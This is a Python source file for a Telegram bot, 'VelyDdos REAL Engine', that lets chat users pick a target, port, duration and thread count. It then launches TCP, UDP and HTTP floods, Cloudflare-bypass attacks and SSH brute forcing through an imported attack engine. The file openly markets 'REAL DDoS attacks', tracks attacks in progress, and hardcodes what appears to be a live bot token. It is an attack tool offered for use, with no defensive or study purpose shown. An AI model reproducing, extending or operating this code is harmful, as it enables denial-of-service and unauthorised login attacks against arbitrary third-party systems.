import telebot
from telebot import types
import json
import time
from datetime import datetime
from ddos_engine import engine
import threading

bot = telebot.TeleBot("8513023259:AAFvsQ8p-Uw6vO0-4-o21_IWX8SDfib0m70")
active_attacks = {}

# ==================== /start ====================
@bot.message_handler(commands=['start'])
def start(message):
    photo_url = "https://files.catbox.moe/kt6tdp.heic"
    
    caption = """
**Welcome To VelyDdos REAL Engine**

Developer: `Gxyenn 正式`
Version: `2.0 REAL`

Press the button below to launch REAL DDoS attacks.
"""
    
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("⚡ REAL Attack Menu", callback_data="attack_menu"),
        types.InlineKeyboardButton("📊 Live Attacks", callback_data="live_status"),
        types.InlineKeyboardButton("⚙️ Settings", callback_data="settings")
    )
    
    bot.send_photo(message.chat.id, photo_url, caption=caption, 
                   parse_mode="Markdown", reply_markup=markup)

# ==================== ATTACK MENU ====================
@bot.callback_query_handler(func=lambda call: call.data == "attack_menu")
def attack_menu(call):
    markup = types.InlineKeyboardMarkup(row_width=2)
    
    # Layer 4
    markup.add(
        types.InlineKeyboardButton("TCP Flood", callback_data="method_tcp"),
        types.InlineKeyboardButton("UDP Flood", callback_data="method_udp"),
        types.InlineKeyboardButton("SYN Flood", callback_data="method_syn"),
        types.InlineKeyboardButton("HTTP Raid", callback_data="method_http")
    )
    
    # Layer 7 Advanced
    markup.add(
        types.InlineKeyboardButton("Cloudflare Bypass", callback_data="method_cf"),
        types.InlineKeyboardButton("OVH Protected", callback_data="method_ovh"),
        types.InlineKeyboardButton("Game Server", callback_data="method_game"),
        types.InlineKeyboardButton("VPN Bypass", callback_data="method_vpn")
    )
    
    # Server Attacks
    markup.add(
        types.InlineKeyboardButton("SSH BruteForce", callback_data="method_ssh"),
        types.InlineKeyboardButton("RDP Hammer", callback_data="method_rdp"),
        types.InlineKeyboardButton("MySQL Flood", callback_data="method_mysql"),
        types.InlineKeyboardButton("Minecraft Crash", callback_data="method_mc")
    )
    
    # Mixed
    markup.add(
        types.InlineKeyboardButton("Mixed Vector", callback_data="method_mixed"),
        types.InlineKeyboardButton("Custom Payload", callback_data="method_custom")
    )
    
    markup.add(
        types.InlineKeyboardButton("🔙 Back", callback_data="back_start"),
        types.InlineKeyboardButton("📊 Status", callback_data="live_status")
    )
    
    bot.edit_message_caption(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        caption="**🎯 Select REAL Attack Method:**",
        parse_mode="Markdown",
        reply_markup=markup
    )

# ==================== CONFIGURATION ====================
@bot.callback_query_handler(func=lambda call: call.data.startswith("method_"))
def method_config(call):
    method = call.data.replace("method_", "")
    
    config_msg = f"""
**⚙️ {method.upper()} Configuration**

Enter target details:
1. Target IP/Domain
2. Port (default based on method)
3. Duration (seconds)
4. Threads/Power

*Example:*
`target.com 80 60 1000`

Reply with configuration in one message.
"""
    
    msg = bot.edit_message_caption(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        caption=config_msg,
        parse_mode="Markdown"
    )
    
    bot.register_next_step_handler(msg, process_attack_config, method)

# ==================== PROCESS CONFIG ====================
def process_attack_config(message, method):
    try:
        parts = message.text.split()
        if len(parts) < 3:
            bot.reply_to(message, "❌ Invalid format. Use: target port duration [threads]")
            return
        
        target = parts[0]
        port = int(parts[1]) if len(parts) > 1 else 80
        duration = int(parts[2])
        threads = int(parts[3]) if len(parts) > 3 else 1000
        
        # Validate duration (max 24 hours)
        if duration > 86400:
            duration = 86400
        
        attack_id = f"{method}_{int(time.time())}"
        
        # Store attack
        active_attacks[attack_id] = {
            'method': method,
            'target': target,
            'port': port,
            'duration': duration,
            'threads': threads,
            'start_time': time.time(),
            'status': 'STARTING'
        }
        
        # Launch REAL attack in background
        launch_thread = threading.Thread(
            target=launch_real_attack,
            args=(attack_id, method, target, port, duration, threads, message.chat.id)
        )
        launch_thread.start()
        
        # Send confirmation
        status_msg = f"""
**✅ REAL Attack Launched**

ID: `{attack_id}`
Method: `{method.upper()}`
Target: `{target}:{port}`
Duration: `{duration} seconds`
Threads: `{threads}`
Status: `RUNNING`

*Attack will auto-stop after {duration}s*
"""
        
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("🛑 Stop Now", callback_data=f"stop_{attack_id}"),
            types.InlineKeyboardButton("📊 Live Stats", callback_data=f"stats_{attack_id}"),
            types.InlineKeyboardButton("🏠 Menu", callback_data="back_start")
        )
        
        bot.send_message(
            message.chat.id,
            status_msg,
            parse_mode="Markdown",
            reply_markup=markup
        )
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# ==================== LAUNCH REAL ATTACK ====================
def launch_real_attack(attack_id, method, target, port, duration, threads, chat_id):
    try:
        active_attacks[attack_id]['status'] = 'RUNNING'
        
        # Execute REAL attack based on method
        if method == 'tcp':
            result = engine.tcp_flood(target, port, duration, threads)
        elif method == 'udp':
            result = engine.udp_amp(target, port, duration)
        elif method == 'http':
            result = engine.http_raid(target, duration, threads)
        elif method == 'cf':
            result = engine.cf_bypass(target, duration)
        elif method == 'ssh':
            result = engine.ssh_bruteforce(target, duration)
        else:
            result = engine.tcp_flood(target, port, duration, threads)  # Default
        
        # Update status when done
        time.sleep(duration)
        active_attacks[attack_id]['status'] = 'COMPLETED'
        active_attacks[attack_id]['end_time'] = time.time()
        
        # Send completion notification
        bot.send_message(
            chat_id,
            f"**✅ Attack {attack_id} Completed**\nMethod: {method}\nTarget: {target}\nResult: {result}",
            parse_mode="Markdown"
        )
        
    except Exception as e:
        active_attacks[attack_id]['status'] = 'FAILED'
        active_attacks[attack_id]['error'] = str(e)

# ==================== LIVE STATUS ====================
@bot.callback_query_handler(func=lambda call: call.data == "live_status")
def show_live_status(call):
    if not active_attacks:
        status_msg = "**📊 No Active Attacks**\nLaunch an attack to see live status."
    else:
        status_msg = "**📊 LIVE ATTACK STATUS**\n\n"
        for attack_id, data in list(active_attacks.items()):
            elapsed = time.time() - data['start_time']
            remaining = data['duration'] - elapsed if 'duration' in data else 0
            
            status_msg += f"""
**ID:** `{attack_id}`
**Target:** `{data['target']}:{data.get('port', 'N/A')}`
**Method:** `{data['method'].upper()}`
**Status:** `{data['status']}`
**Elapsed:** `{int(elapsed)}s / {data['duration']}s`
**Threads:** `{data.get('threads', 'N/A')}`
"""
    
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("🔄 Refresh", callback_data="live_status"),
        types.InlineKeyboardButton("🛑 Stop All", callback_data="stop_all"),
        types.InlineKeyboardButton("🏠 Menu", callback_data="back_start")
    )
    
    bot.edit_message_caption(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        caption=status_msg,
        parse_mode="Markdown",
        reply_markup=markup
    )

# ==================== STOP ATTACK ====================
@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
def stop_attack(call):
    attack_id = call.data.replace("stop_", "")
    
    if attack_id == "all":
        active_attacks.clear()
        bot.answer_callback_query(call.id, "✅ All attacks stopped")
    elif attack_id in active_attacks:
        active_attacks[attack_id]['status'] = 'STOPPED'
        bot.answer_callback_query(call.id, f"✅ Attack {attack_id} stopped")
    
    show_live_status(call)

# ==================== BACK HANDLER ====================
@bot.callback_query_handler(func=lambda call: call.data == "back_start")
def back_to_start(call):
    start(call.message)

# ==================== POLLING ====================
if __name__ == "__main__":
    print("[+] VelyDDoS REAL Engine Started")
    print(f"[+] Active Methods: TCP, UDP, HTTP, CF Bypass, SSH, etc")
    print(f"[+] Timer Support: 1s to 24 hours")
    print(f"[+] Live Monitoring: Enabled")
    bot.polling(none_stop=True)
